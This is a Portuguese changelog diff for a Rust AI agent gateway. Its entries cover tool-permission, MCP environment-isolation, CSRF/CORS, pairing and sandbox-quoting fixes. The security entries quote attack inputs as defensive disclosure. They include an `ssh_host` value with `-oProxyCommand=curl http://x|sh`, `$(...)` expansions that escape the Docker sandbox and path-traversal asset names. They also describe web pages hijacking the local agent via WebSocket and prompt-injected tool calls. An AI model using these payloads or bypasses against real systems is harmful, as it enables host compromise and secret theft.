+  de verdade (o teto invalido cai no default r1 no boot). A entrada de
+  `allowed_origins: ["*"]` no threat model tambem cita o check como
+  "Validacao" — virou "Report (opt-in)". Varredura do repo por afirmacoes
+  de gate nao achou mais nenhum ponto falso; os demais usos do comando na
+  doc ja o descrevem como validacao de leitura.
+- `SessionStore::validate_session_token` deixou de montar a clausula de idle
+  via `format!` (regra 5): o timeout agora entra por bind (`'+' || ?2 ||
+  ' seconds'`, coercao nativa do SQLite) e um teste varre o fonte para o
+  padrao nao voltar, com teste de regressao do timeout positivo (#1247).
+- **Rede caida nao acionava o fallback para o provider local** (#1249). A
+  classificacao de retry casava texto de erro (`429`, `5xx`, `upstream`) e
+  falha de transporte (`connection refused`, DNS, timeout de conexao) nao casa
+  com padrao nenhum — o turno morria em `Err(e) => return Err(e)` ANTES do
+  laco de fallback, nos caminhos batch e streaming: usuario tira o cabo e
+  recebe erro em vez do Ollama que ja roda na maquina (ADR 0022, local-first).
+  Agora existe a variante tipada `Error::Transport`, construida no ponto onde
+  o `reqwest::Error` ainda existe como tipo (`providers::erro_de_envio`,
+  chamado nos quatro providers — openai, anthropic, ollama, llama_cpp — e nos
+  dois bracos, batch e streaming de cada um); o runtime classifica pela CLASSE
+  e nao pela frase (`is_transport_error`). Transporte gasta **uma** tentativa
+  e cai direto para o fallback, sem queimar o orcamento de retry (insistir 4x
+  num endereco inalcancavel queimava ~3,5s de backoff); o breaker recebe a
+  falha do mesmo jeito. 429/5xx continua no comportamento historico (retry
+  com backoff no mesmo endereco). Testes com tempo virtual (`test-util`)
+  provam a contagem de tentativas nos dois caminhos e o turno completo pelo
+  fallback local.
+- O codigo `#[cfg(windows)]` sob a feature `mcp` (wrapper `cmd /c` do
+  `manager.rs`) agora compila no CI: um step Windows-only no job matrix roda
+  `cargo check -p garraia-agents --features mcp --all-targets`, onde a
+  toolchain MSVC nativa do runner ja existe. O caminho mingw cross foi
+  descartado com medicao (#1253).
+- A doc agora diz explicitamente que o hardening de permissoes de arquivo
+  e so Unix: `config.yml` no Windows herda a ACL default do diretorio, e os
+  modos `0600`/`0700` da sessao WhatsApp nao se aplicam la (#1253).
+- **O `git_diff` e o `code_review` respondiam sobre o repositorio errado.** As duas tools
+  montavam o `Command::new("git")` sem `current_dir`, entao o git herdava o diretorio de
+  trabalho do *processo do gateway* em vez do `working_dir` da sessao que pediu a tool: uma
+  sessao com projeto em A recebia o diff do repositorio onde o gateway subiu — ou
+  "not a git repository", quando aquele diretorio nao era repositorio nenhum. Pior que a
+  resposta errada, o resultado nao era reproduzivel entre instalacoes: o diretorio do
+  processo depende de como ele subiu (`garra start` num terminal, unidade systemd com
+  `WorkingDirectory=`, sidecar do desktop, container), de modo que o mesmo prompt, na mesma
+  sessao, dava resposta diferente sem nada no pedido explicar a diferenca. Agora o git roda
+  no `working_dir` da sessao quando ha um; sem ele — o caso comum, porque um prompt de canal
+  nao traz projeto — o diretorio do processo e mantido, mas a resposta passa a **dizer de
+  qual repositorio ela falou**, porque a resposta errada silenciosa era o defeito real.
+  Um `working_dir` que nao existe falha nomeando o diretorio em vez de cair de volta no
+  diretorio do processo. Os testes exercitam as tools pelo caminho do agente (`execute` com
+  `ToolContext`) contra dois repositorios temporarios, e nao pela funcao interna. No
+  `code_review`, de carona e no espirito do #1269, o `commit_range` (que vem do modelo e e
+  argumento argv) passou a ser recusado quando comeca com `-` (`--output=...` escreveria
+  arquivo, `--stdin` penduraria o filho ate o timeout) e o filho git nao le mais a entrada
+  padrao do gateway.
+- **O ledger CodeQL passou a ancorar por conteudo, nao por numero de linha
+  (#1263).** `check-ledger-anchors.py` procura o `sink_snippet` no arquivo e
+  DERIVA a linha, em vez de le-la do JSON e comparar. Antes, qualquer commit
+  que acrescentasse ou removesse linhas ACIMA de um sink derrubava o gate sem
+  encostar no statement suprimido — a entrada #113 andou duas vezes no mesmo
+  PR (#1252), `:769` para `:826` para `:867`, sem o snippet mudar um byte, e
+  cada rodada custou uma fila de ~110 jobs. Pior: o caminho mais rapido para
+  ficar verde era editar o `sink_snippet` ate casar com a linha, o que e
+  fraudar o registro de auditoria. Agora o gate fica vermelho em um caso so: o
+  statement mudou, sumiu, ou ficou ambiguo. `line` virou campo derivado e o
+  proprio checker o reescreve no `.json` e na coluna `File:line` do `.md`,
+  dizendo `linha derivada X (antes Y)`; no CI ele roda com `--no-rewrite` e so
+  reporta. Snippet com 2+ ocorrencias no arquivo agora e erro explicito de
+  configuracao, resolvido por uma ancora auxiliar de conteudo
+  (`"disambiguator": {"kind": "function", "value": "<fn envolvente>"}`) e nunca
+  por ordinal, que reaponta em silencio quando aparece um statement identico
+  acima — 13 das 30 entradas precisaram disso. De brinde, as citacoes
+  `arquivo:linha` dentro das justificativas passaram a ser conferidas: era por
+  falta disso que um drift sobrevivia escondido num documento de auditoria de
+  seguranca (a justificativa do #113 citava `:630` e `:643` quando o codigo
+  estava em `:824` e `:837`).
+- **Ferramenta de servidor MCP ignorava a whitelist do modo do agente** (#1264).
+  O `ToolGate::permite` isentava qualquer nome que contivesse o separador `__`
+  — a whitelist era consultada, e a isencao nao: modo somente-leitura
+  (`search`/`architect`/`debug`/`review`/`edit`) deixava passar ferramenta de
+  escrita de um servidor MCP conectado. Agora a permissao e **declarada**:
+  `whitelist_mode` vale para MCP, e a sintaxe `servidor/*` na `allowed`
+  libera o servidor inteiro (`meu-servidor/*` cobre `meu-servidor__<qualquer
+  nome>`); nome completo libera so aquela ferramenta; `denied` continua
+  vencendo tudo, prefixo incluso. `whitelist_mode = true` com `allowed` vazia
+  continua **permitindo tudo** (opcao (b), compatibilidade) — mas o runtime
+  emite aviso por turno nesse caso, e o aviso de ferramenta MCP escondida
+  diz o nome e a sintaxe que libera. Os testes exercitam o portao que o
+  runtime monta de verdade (`ModeProfile::from_custom` + `ToolGate::
+  para_o_turno`) e o turno completo do runtime; a mutacao da isencao de volta
+  derruba 3 testes.
+- **Filhos de `run_tests` e `bash` nao herdam mais o stdin do gateway
+  (#1270).** A varredura sistematica de argv injection que a #1270 pedia
+  (sign-off do PR #1268) inventariou as 14 chamadas de `std::process::Command`
+  nas tools e achou um achado novo da mesma familia que o #1269 fechou no
+  `git_diff`/`code_review`: o filho de `repo_search`, `git_diff` e
+  `code_review` ja rodava com stdin fechado, mas o de `run_tests` (nos cinco
+  frameworks) e o do `bash` herdavam o stdin do processo do gateway — em
+  terminal, um `cat` sem argumento no comando rouba o que o operador digitou,
+  e o comportamento dependia de como o processo subiu (`garra start`, systemd,
+  sidecar, container). Agora os dois fecham o stdin (`Stdio::null()`), com
+  guard que varre o fonte (padrao do `spinner.rs`) e o inventario completo
+  das tools no threat-model §5.72. Zero achados de argv injection: todas as
+  tools que montam linha de comando ja seguem o padrao do #1268 (terminador
+  `--` ou valor colado na opcao).
+- **Uma escrita de admin nao apagava mais o que os outros servidores declaravam em `mcp.json`.**
+  O gateway mantinha dois tipos com o mesmo nome para o mesmo arquivo: o `McpServerConfig` do
+  `garraia-config` (que o boot le) carregava `allowed_tools`, `inherit_env` e `enabled`, mas o
+  `McpServerConfig` do registry — o que `save_from_registry` serializa de volta para o arquivo a
+  cada POST/DELETE em `/admin/api/mcp` — nao carregava nada disso. Uma unica criacao ou remocao
+  de servidor pela admin API reescrevia o `mcp.json` sem a allowlist GAR-190 de TODOS os
+  servidores do arquivo (a sonda do corpo da issue provava: apos um `add_server` +
+  `save_from_registry`, `allowed_tools` tinha saido do disco). O mesmo defeito derrubava o
+  `inherit_env` (#1075), a chave de boot `enabled` — um servidor desligado religava no proximo
+  boot — e o tuning snake_case (`memory_limit_mb`, `max_restarts`, `restart_delay_secs`), que o
+  registry nem lia. O tipo do registry agora carrega os tres campos, com aliases de leitura que
+  fazem os dois lados concordarem em um schema so: `allowed_tools` e `inherit_env` sao gravados
+  na grafia snake_case canonicamente lida pelo boot, e o tuning snake_case escrito a mao agora
+  sobrevive ao round-trip. `POST /admin/api/mcp` passa a aceitar `allowed_tools`, e o `GET`
+  expoe `allowed_tools` e `inherit_env`. O timeout continua sem alias camelCase no loader de
+  proposito: ler o `timeoutSecs: 30` default do writer sobrescreveria
+  `timeouts.mcp.default_secs` em servidores em que o operador nunca escolheu um timeout. O
+  restart da admin API mantem o isolamento forcado de ambiente (#1075) — o campo agora viaja no
+  tipo, mas honrar a declaracao no restart e mudanca de stance propria.
+- **O `serve` do WhatsApp vinculado nao via o caso "conectou e emudeceu".**
+  Os relogios do driver so valiam antes do `connected` — com razao: depois
+  dele, silencio e o estado normal de uma conta sem mensagens, e cortar por
+  silencio derrubaria o canal saudavel toda madrugada. Uma ponte que
+  conectava, entregava a sessao e parava de falar sem fechar o stdout e sem
+  morrer ficava morta em silencio para sempre: sem queda visivel, sem
+  reconexao, sem ninguem olhando um terminal. O conserto e prova de vida no
+  protocolo, nao mais um prazo: depois do `connected` o driver manda `ping`
+  a cada `ServeOptions::ping_every_secs` (15 s em producao) e exige resposta
+  — qualquer evento, e um `pong` explicito — dentro de
+  `ServeOptions::pong_deadline_secs` (45 s em producao). Prazo vencido cai em
+  `ServeExit::Dropped { was_connected: true }`, e o backoff que ja existia
+  assume. Um bridge de versao anterior que nao conhece `ping` responde com o
+  evento `error` de comando desconhecido — que tambem prova vida e por isso
+  tambem serve. A fixture ganhou o cenario `serve-wedge` (conecta, entrega a
+  sessao e para de falar e de ler o stdin), exercitado pelo driver.
+- **A varredura de segredo do canal whatsapp-linked deixava todo `impl`
+  gerado por `macro_rules!` passar.** A regra que proibe `SessionBlob` de
+  ganhar conversao nova para `&str` olhava so para `impl` cuja linha contém
+  "SessionBlob"; uma macro que gera `impl ::core::convert::AsRef<str> for $t`
+  nao tem a palavra na linha do `impl` e chegava 111/111 verde. A regra agora
+  e invertida (todo-impl): TODO `impl` de `session.rs` tem de estar na
+  allowlist fechada `IMPL_ALLOWED` (9 entradas — as 4 originais de `SessionBlob`
+  mais as 5 de `KeyOrigin`/`SessionKey`/`SessionStore`/`SessionError`),
+  indentacao e cortada antes da comparacao, e o caso negativo entra como texto
+  plantado — macro de ataque do issue, `impl Deref` manual a mao e `impl`
+  indentado dentro de `mod` sao reportados; os 9 impls reais de producao
+  confirmam que a allowlist continua viva.
+- **Loop detector: o erro de tool em loop traz o diagnostico do input repetido (#1295, item 2 de 3).**
+  Em vez do seco "tool loop detected: <tool>", o erro agora leva o nome da
+  ferramenta, a contagem da janela (3 chamadas identicas em sequencia) e o
+  input repetido — e quem le (o humano no log, no ledger de runs ou no
+  cartao da CLI) tem como corrigir. O input sai pela mesma allow-list do
+  `summarize_tool_input` (#937): o campo que interessa da ferramenta
+  (`command`, `path`, `url`...), redigido e truncado; ferramenta sem caso
+  proprio mostra so os nomes das chaves e o tamanho, nunca valor — o erro e
+  persistido e exibido, e um `{"password": ...}` de tool nova nao tem
+  formato que o redactor reconheca. A mensagem nasce num unico lugar
+  (`ExecutionBudget::mensagem_de_loop`) e passa pelo despacho unico do
+  #1311; o gatilho (3 assinaturas identicas) nao mudou.
+- **Tools nativas devolviam `Err(Error::Agent(...))` em parâmetro obrigatório
+  ausente.** Quatorze pontos de validação em dez tools (`file_read`,
+  `file_write`, `bash`, `web_fetch`, `web_search`, `git_diff`, `device_read`,
+  `device_execute`, `schedule_heartbeat`, `schedule_recurring`) tratavam
+  chamada malformada do modelo como erro fatal de turno: o dispatch do
+  runtime converte o `Err` em texto com o prefixo enganoso `agent error:` e
+  sem orientação de schema, e caminhos sem amortecimento (orquestrador)
+  falham o step inteiro. Agora toda ausência/tipo errado de parâmetro volta
+  como observação soft (`Ok` + `is_error`) com mensagem que nomeia o
+  parâmetro, o schema da chamada e pede o reenvio — o modelo se autocorrige
+  no mesmo turno, no padrão que `list_dir` e `channel_send` já seguiam.
+  `Err` fica reservado a falha ambiental real (IO, permissão, jail,
+  recusa de política).
+- `/model` no chat agora e transacional: valida o identificador contra o
+  catalogo real do provider (nova surface `validar_modelo` em `LlmProvider`;
+  o OpenRouter consulta a lista completa `GET /models`, nao a curada de
+  populares) antes de alterar o estado. Modelo ausente, provider sem resposta
+  ou erro de rede recusam a troca e mantem provider/model anteriores, com
+  mensagem dizendo o estado vigente. Rota valida fora da lista curada (ex.:
+  `z-ai/*`, o padrao do ADR 0022) aplica com nota explicita de que nao vem do
+  `/models`; provider sem catalogo aplica com ressalva de troca nao validada.
+- **OpenRouter 404 `No allowed providers are available` chegava como erro cru
+  do provider.** A preferencia `provider.only` em vigor (sufixo `:provider`
+  no slug do modelo ou preferencia da conta) sem intersecao com os providers
+  que servem o modelo condena a requisicao antes de sair, mas a mensagem nao
+  dizia o que configurar. Os dois caminhos do provider OpenAI-compativel
+  (batch e streaming) agora classificam essa assinatura como erro de
+  configuracao de roteamento nao-transitorio, com modelo, restricao efetiva
+  (`permits only:`), providers compativeis e caminho de recuperacao
+  (`/model <outro-modelo>` ou ajuste da preferencia na conta OpenRouter — o
+  Garra nao altera `provider.only` por conta propria). O classificador de
+  retry do runtime trata a assinatura como nao-retryable, inclusive se o
+  texto carregar um numero de status retryavel no meio (#1299).
+- O chat agora grava a pergunta ANTES do turno rodar e grava um marcador
+  explicito (`[turno interrompido: timeout|cancelado|erro]`) quando o turno
+  acaba sem resposta. Um crash, timeout ou Ctrl+C nao apaga mais o turno do
+  ponto de vista do `--resume`: a sessao restaurada termina na pergunta
+  interrompida, com o motivo marcado. `garraia chat --resume` sem valor (ou
+  `--resume latest`) retoma a sessao com a atividade mais recente do CLI
+  (nova query `latest_session_id` no SessionStore, isolada por canal), e o
+  novo comando `/resume [id]` do REPL faz o mesmo sem reiniciar, avisando
+  quando o ultimo turno terminou interrompido.
+- O REPL interativo (`garra chat` ou `garra`) nao exibe mais linhas cruas de
+  tracing (`WARN garraia_agents::...`) no terminal: retry, fallback e circuit
+  breaker do provider ficam em silencio no console padrao, porque a falha de
+  turno ja vira cartao de erro acionavel. `garraia.log` continua recebendo
+  tudo, e `--verbose`, `--debug` ou `RUST_LOG` explicito vencem o silencio
+  como antes (#1301).
+- CodeQL: `codeql-reapply-dismissals.sh` compara a linha do ledger contra o span do statement no alerta (start..end) em vez de exigir igualdade com o start_line, porque statements multi-linha (o `println!` do alerta 173) separam o inicio do statement da linha do sink ancorada; rule_id e path continuam casando exatamente.
+- Bridge WhatsApp: `materialize` agora valida o nome de cada asset contra uma accept-list de unico segmento de arquivo antes de qualquer escrita em disco, fechando o path-injection apontado pelo CodeQL (alerta 174) para qualquer implementacao futura de `BridgeAssets` — nomes como `../escapou`, path absoluto, separador de Windows e NUL viram `BridgeError::AssetName`.
+
+### Security
+- **Servidor MCP stdio deixa de herdar o ambiente inteiro do gateway (completa
+  o hardening da #1075; sandbox do processo segue na #1225).** Ate agora o
+  `McpManager::connect` montava o `Command` do processo filho sem
+  `env_clear()`. Consequencia direta: todo servidor MCP recebia, no proprio
+  ambiente, `GARRAIA_JWT_SECRET`, `GARRAIA_REFRESH_HMAC_SECRET`, as chaves de
+  provider (`ANTHROPIC_API_KEY`, `OPENROUTER_API_KEY`, ...),
+  `GarraIA_VAULT_PASSPHRASE`, `DATABASE_URL` e qualquer outra variavel que o
+  `dotenvy` tivesse carregado do `.env`. O mapa `env` da config era aplicado
+  POR CIMA dessa heranca, nao no lugar dela, entao declarar `env` nunca
+  restringiu nada.
+  O que torna isso grave no MCP e a origem do binario: um servidor MCP e
+  tipicamente um pacote de terceiro resolvido na hora (`npx -y algum-server`),
+  e ler `std::env` no proprio `main()` nao exige tool call, prompt injection
+  nem rede do agente — basta ser spawnado. O #1075 ja tinha fechado esse mesmo
+  buraco para as tools de shell (`bash_tool`, `run_tests`, `git_diff`,
+  `code_review`, `repo_search`) com a `R3_ENV_ALLOWLIST`; o caminho MCP ficou
+  de fora, e uma varredura por `env_clear` no repositorio nunca encontrava o
+  `manager.rs`.
+  Agora o ambiente do filho e construido do zero, nesta ordem: allowlist
+  minima do ambiente do gateway (`PATH`, `HOME`, locale, `TMPDIR`, `TZ`,
+  bundles de CA, mais o complemento de plataforma — `SystemRoot`/`COMSPEC`/
+  `APPDATA` no Windows, `PREFIX`/`LD_PRELOAD` no Termux) e, por cima, o mapa
+  `env` daquele servidor, que e onde o operador coloca de proposito o
+  `GITHUB_TOKEN` e afins. A allowlist MCP e um superset deliberado da R3 e vive
+  ao lado dela em `garraia_common::safety_gate`: um servidor MCP e um programa
+  completo (`npx`/`uvx`/`python`) e precisa de cache, temp e locale so para
+  subir, enquanto a R3 serve um comando de shell efemero — fundir as duas faria
+  qualquer afrouxamento aqui afrouxar junto o `bash_tool`. Variaveis de proxy
+  (`HTTP_PROXY`/`HTTPS_PROXY`) ficaram de fora de proposito, porque a URL pode
+  embutir usuario e senha.
+  A valvula de escape e `inherit_env: true` por servidor no `config.yml` /
+  `mcp.json` (default `false`): devolve ao filho o ambiente completo, emite
+  `warn!` nomeando o servidor no primeiro connect (reconnects automaticos caem
+  para `debug!`, para nao afogar o log de um servidor em loop de restart) e
+  nunca registra nome nem valor de variavel. Ela existe para destravar um
+  servidor legado enquanto o operador migra a variavel para o mapa `env`, e
+  nao esta disponivel na admin API — servidor criado OU reiniciado por ali
+  conecta sempre isolado, mesmo que o `config.yml` declare `inherit_env: true`
+  para aquele nome. A politica viaja junto dos parametros de conexao, entao um
+  reconnect automatico do proprio gateway nao a troca em silencio.
+  Nota para quem for escrever `env` no `config.yml`: referencias
+  `vault:<chave>` sao resolvidas apenas no caminho `mcp.json` + admin API
+  (`McpPersistenceService::load_registry`). No boot do `config.yml`
+  (`ConfigLoader::merged_mcp_config`) o valor e copiado como esta, entao um
+  `vault:...` escrito ali chega ao filho como a string literal. Issue #1237.
+  A lacuna era de teste tanto quanto de codigo: o fixture de MCP agora expoe,
+  atras da flag `--expose-env`, uma tool que relata o ambiente que o filho de
+  fato recebeu, e os testes plantam uma variavel no processo de teste e afirmam
+  que ela NAO chega ao filho por padrao, que chega com `inherit_env: true`, e
+  que o mapa `env` explicito chega e vence a heranca.
+- **Pagina web qualquer nao dispara mais POST/PATCH/DELETE contra o gateway local (#1182).**
+  `/api/*` e auth-free por desenho — "quem alcanca a porta e o dono" — mas o navegador
+  do dono alcanca a porta rodando codigo de terceiros: bastava ele visitar uma pagina
+  para ela mandar `PATCH /api/settings`, `POST /api/mode/select`,
+  `POST /api/mcp/marketplace/install`, `POST /v1/chat/completions` (gastando a chave de
+  LLM dele), `DELETE /api/memory` ou `POST /admin/api/setup` (que cria o primeiro admin
+  numa instalacao nova e nao tinha CSRF proprio) contra `127.0.0.1:3888`. O #1093 tinha
+  fechado so `/api/learning/*`; agora a guarda e generica
+  (`garraia_gateway::origin_guard`) e cobre toda a superficie mutante, com a mesma
+  comparacao estrita de `Origin` contra o transporte e o `Host`, mais uma ancora
+  anti-DNS-rebinding que aceita IP literal, `localhost`/`*.localhost` ou nome declarado
+  em `gateway.allowed_origins`. Em HTTP/2 o `Host` vem da `:authority`, entao o console
+  servido com TLS nativo continua passando.
+- **CORS default deixa de ser allow-all (#1182).** `gateway.allowed_origins` vazio (o
+  default de instalacao) anunciava `Access-Control-Allow-Origin: *`, entao a pagina do
+  atacante nao so disparava a escrita como lia a resposta — `/api/settings/effective`
+  inteiro, por exemplo. Agora vazio significa nenhuma origem cross-origin. O Web Console
+  e servido pelo proprio gateway e e same-origin (nao usa CORS); cliente nao-navegador
+  (app mobile, `curl`, Claude Code) ignora CORS. Uma entrada `*` na lista e ignorada com
+  aviso em vez de derrubar o gateway no boot.
+- **`/ws` e `/ws/parrot` passam a checar o `Origin` do handshake (#1182).** WebSocket nao
+  passa por CORS, entao `new WebSocket("ws://127.0.0.1:3888/ws/parrot")` de qualquer
+  pagina abria um turno completo do agente — com as tools, com a chave de LLM do dono,
+  escrevendo na sessao persistente do Garra Desktop e lendo a resposta de volta; a rota
+  nem tinha gate de `api_key` (ele cobre so `/api/*`). Handshake sem `Origin` (app, CLI,
+  `curl`) segue como antes. A webview Tauri do desktop passa pela sua origem exata
+  (`tauri://localhost`; `http://tauri.localhost` so num gateway Windows, porque o Safari
+  entrega `*.localhost` ao resolvedor do sistema — `origin_guard::ORIGENS_TAURI` e
+  `ORIGENS_TAURI_WEBVIEW2`, derivadas do fonte do Tauri 2.11 e nao medidas em runtime
+  nesta entrega; se o passaro parar de conectar, o log diz `gateway: cross-origin
+  request refused` com `path=/ws/parrot`). Pelo mesmo motivo a ancora anti-rebinding
+  aceita `localhost` exato, nunca `*.localhost`. Residual registrado
+  em `docs/security/threat-model.md` secao 5.10: leitura `GET` sob DNS rebinding nao e
+  fechada por regra de `Origin` (o navegador nao manda `Origin` em GET same-origin);
+  a mitigacao e `gateway.api_key`.
+- **Codigo de pareamento ganha limite de tentativas, comparacao constant-time e avisos
+  ao dono (#1191).** O codigo do `/pair` tem 6 digitos (~20 bits) e quem acerta entra na
+  allowlist em disco; ate o #1190 o `claim()` nunca rodava em producao, e quando a
+  fiacao foi consertada tres fragilidades antigas de `garraia_security::PairingManager`
+  passaram a ser alcancaveis. Agora: (1) cada usuario que erra 5 vezes fica 15 minutos
+  sem poder tentar (`LockedOut`, sem nem comparar e sem contar no global), e 20 erros
+  comparados de qualquer usuario desde o ultimo `/pair` queimam todo codigo pendente
+  (`Burned`) — 20 palpites em 10^6 da 2e-5 por ciclo; um `/pair` em outro canal nao zera
+  o contador enquanto um codigo pendente sobrevive; (2) a comparacao usa
+  `subtle::ConstantTimeEq` e percorre todos os codigos sem sair no primeiro; (3)
+  `generate_with_status` devolve `GenerateStatus { code, replaced_pending, previous_burned }`
+  e o `/pair` avisa tanto quando substituiu um codigo ainda nao resgatado quanto quando
+  os codigos foram queimados desde o ultimo `/pair` (e com quantos erros) — sem isso a
+  queima era invisivel: o canal descarta em silencio e o convidado parece ter errado.
+  `claim()` mantem a assinatura `Option<String>` (os 11 canais nao mudam) e o usuario
+  bloqueado ve o mesmo "unauthorized" de sempre — a resposta nao revela se o codigo
+  existia. Limites em `ClaimLimits` (`PairingManager::with_limits`). Trade-off
+  documentado no threat model 5.11: em canal de identidade gratis (IRC sem NickServ,
+  alts de Discord) um atacante persistente consegue queimar cada codigo novo — DoS do
+  pareamento, nao do bot — e o dono fica sabendo pelo `/pair`. Fica de fora, de
+  proposito: escopar o codigo pelo canal de origem (`claim()` segue ignorando o
+  `channel_id`) — a allowlist e global por instalacao e isso e decisao de produto.
+- **`deny.toml` fecha o ignore de RUSTSEC-2024-0388 (`derivative` unmaintained), residual do bump do poise 0.6.2 -> 0.7.0 (#1202).** O poise 0.7.0 trocou `derivative` por `derive-where`; a crate sumiu do `Cargo.lock` e o `ignore` correspondente virou configuracao morta suprimindo um advisory que ja nao se aplica — o tipo de entrada que depois esconde uma reintroducao real. Sem espelho em `.cargo/audit.toml` (o ID nunca esteve la). Comentario de `Cargo.toml` sobre a feature `native_tls_backend` do poise atualizado de `0.6.x` para `0.7.x` (so o numero mudou, a razao documentada continua valendo).
+- **`rustls` atualizado para 0.23.45, corrigindo RUSTSEC-2026-0285 (#1206).** O
+  advisory (TLS 1.3 handshake messages aceitas incorretamente entre fronteiras
+  de nivel de criptografia, severidade 5.3/medium) foi publicado em 2026-09-14
+  contra a versao `0.23.40` ja fixada no `Cargo.lock`. Bump transitivo via
+  `cargo update -p rustls --precise 0.23.45` (dependencia de `reqwest`/
+  `rustls-tls` usada pelo gateway e pelas crates que fazem chamadas HTTP de
+  saida); `aws-lc-rs`/`aws-lc-sys`/`rustls-webpki` acompanharam a atualizacao.
+- **O sandbox por tool passa a conter o comando de verdade — metacaractere de
+  shell nao escapa mais para o host (correcao da #1222).** A primeira versao do
+  `SandboxPolicy::wrap_command` montava a linha do `docker run` citando o
+  comando com `{:?}`, o `Debug` do Rust. `escape_debug` parece quoting mas nao
+  e: ele escapa `"`, `\` e caracteres de controle, e nao toca em `$` nem em
+  crase. Como o `BashTool` entrega a linha inteira ao shell do host
+  (`sh -c <linha>`), um comando contendo `$(...)` ou crase era expandido pelo
+  **host**, antes de o `docker run` sequer existir. O container recebia apenas
+  o resultado da expansao.
+  O efeito e o oposto do proposito da funcionalidade: `--network none`,
+  `--security-opt no-new-privileges` e o mount do workdir seguiam todos
+  presentes na linha de comando e todos irrelevantes, porque o comando do
+  atacante nunca chegava a entrar no container. E a entrada e alcancavel: o
+  comando vem de tool call do LLM, que o proprio projeto ja trata como
+  influenciavel por injecao indireta de prompt (#1213). Fail-closed quando o
+  backend falta, fail-open no conteudo do comando — a combinacao pior, porque
+  o operador liga `mode: all` e passa a confiar numa contencao que nao existe.
+  O mesmo valia para o `cwd`, interpolado sem aspas em `-v {cwd}:{cwd}`: um
+  diretorio com `;` virava comando extra no host, e um com espaco simplesmente
+  quebrava o `docker run`.
+  Agora `command`, `cwd`, `image` e o host do `ssh` passam por `sh_quote`,
+  quoting POSIX com aspas simples (`'\''` para a aspa interna) — dentro de
+  aspas simples o shell nao expande nada. O ramo `ssh` leva **duas** camadas,
+  porque o `ssh` nao entrega argv ao host remoto: ele remonta uma string que o
+  shell remoto reparseia, entao uma camada morre em cada lado.
+  A lacuna real era de teste: os onze testes existentes afirmavam que as flags
+  de hardening estavam presentes na string, e nenhum afirmava que um
+  metacaractere ficava **inerte**. Os novos testes executam a string por um
+  shell de verdade e conferem que o comando chega como uma unica palavra
+  literal — inclusive um que falha de proposito se alguem "simplificar" o
+  quoting duplo do `ssh`.
+  De quebra, `fail_closed_backend_ausente` deixou de depender de haver cliente
+  `ssh` instalado: ele fazia `.unwrap()` no retorno e quebrava em qualquer
+  maquina sem ssh; agora asserta explicitamente os dois desfechos possiveis,
+  em vez de pular em silencio.
+- **`agent.sandbox.mode = all` passa a dizer o que NAO cobre (#1225 S2, parte segura).**
+  O docstring de `SandboxMode::All` prometia "toda tool shell-listada roda no sandbox", e
+  so o `BashTool` consulta a policy: `run_tests` (cargo/flutter/npm/python), `git_diff`,
+  `code_review` e `repo_search` spawnam no host sem olhar `mode` nenhum. Quem ligava `all`
+  esperando "nada roda no host" estava enganado sobre quatro tools, e fora de um paragrafo
+  do threat model nada no produto dizia isso. Agora a lista e uma constante publica
+  (`garraia_agents::sandbox::HOST_ONLY_SPAWNING_TOOLS`, espelhada em
+  `garraia_config::sandbox::TOOLS_SO_NO_HOST` porque config nao depende de agents), dita
+  em tres lugares que o operador ve: os docstrings de `SandboxMode::All`/`Allowlist`; um
+  `warn!` unico por processo (`avisa_cobertura_do_sandbox`) na subida do gateway, do
+  `garra chat` e do `garra mcp-server` com a tool `garra_agent` ligada (so nomes de tool,
+  nenhum valor de config) — separado da construcao da policy de proposito, porque no MCP
+  `sandbox_policy_from` roda a cada chamada de `garra_agent` e o aviso sairia por chamada;
+  e um Warning do `garra config check` quando uma dessas quatro aparece em
+  `sandboxed_tools`/`elevated`, nomeando a tool, o que o sandbox cobre e o proximo passo.
+  So quando listada: `--strict` promove Warning a exit 2, e a secao recomendada
+  (`mode = all` + docker) continua saindo com exit 0.
+  A constante e presa por um teste que varre `crates/garraia-agents/src/tools/`: toda tool
+  com `Command::new` em codigo de producao tem de estar na lista OU chamar
+  `sandbox.wrap_command(`, e nada pode estar nas duas. Quando a metade estrutural da S2
+  rotear uma delas pelo sandbox, o teste obriga a tira-la da lista — e a documentacao nao
+  volta a prometer o contrario do codigo. Um segundo teste, no gateway (a unica crate que
+  ve as duas), confere o espelho da config. Rotear as quatro tools pelo sandbox continua
+  na #1225.
+- **Sandbox: valor de config que comecaria com `-` deixa de virar OPCAO do `ssh`/`docker`
+  (#1225).** O `sh_quote` da #1231 garante que o comando chegue como **um token** — o que
+  barra injecao de comando e nao barra injecao de *opcao*. Na linha
+  `ssh {host} -- sh -lc …` o host fica **antes** do `--`, entao um
+  `agent.sandbox.ssh_host: "-oProxyCommand=curl http://x|sh"` continua sendo um token so e
+  o `ssh` o le como flag: o comando do atacante executa no host **local**, ja depois de o
+  `safety_gate` ter aprovado outra coisa. O mesmo vale para `agent.sandbox.image`, que e
+  posicional do `docker run` e desloca tudo que vem depois.
+  Nenhum host de verdade e nenhuma imagem de verdade comeca com `-`, entao a defesa e
+  recusar, em tres camadas: o `sandbox_policy_from` nao constroi backend nenhum (imagem
+  cai no default) com um `warn!` que **nunca** loga o valor, o proprio `wrap_command`
+  recusa fail-closed, e o `garra config check` reporta Error — este ultimo e comando
+  opt-in, nao gate de boot (nada no boot do gateway chama o `run_check`), entao quem
+  garante a propriedade sao as duas primeiras, que rodam sempre. O guard do wrap fica antes do
+  `is_available()`, para que num host sem cliente `ssh` o erro de backend ausente nao
+  mascare o de injecao de opcao. O conserto estrutural, montar argv em vez de uma linha de
+  shell, fica como tracking na #1225 (slices S2/S3), como ja recomendado na #1231.
+- **Sandbox fora de unix passa a falhar fechado (#1225).** O `BashTool` escolhe
+  `powershell -Command` no Windows e receberia uma linha com quoting POSIX, que o
+  PowerShell nao reparseia da mesma forma (la a aspa simples escapa como `''`). Antes isso
+  era so uma nota de documentacao: a contencao parecia ligada e nao continha. Agora o
+  `wrap_command` devolve erro e o `config check` reporta Error quando a secao esta ligada
+  em `cfg!(windows)`.
+- **Sandbox que esta ligado e inerte passa a ser reportado (#1225).** Aviso quando
+  `mode: all` tem `bash` em `elevated` — como so a tool `bash` e envolvida hoje, isso
+  equivale a `mode: off` com passos extras — e quando uma entrada de `sandboxed_tools` ou
+  `elevated` nao e uma tool que o sandbox saiba envolver; o finding nomeia a entrada,
+  porque apontar o typo (`Bash`, `run_tests`) e a razao de ele existir. Nomes agora sao
+  trimados na conversao, entao `" bash"` vindo de uma lista YAML deixa de ser um item que
+  existe no arquivo e nao existe para o codigo; caixa NAO e normalizada, porque o registry
+  de tools e case-sensitive e "consertar" escondia o erro.
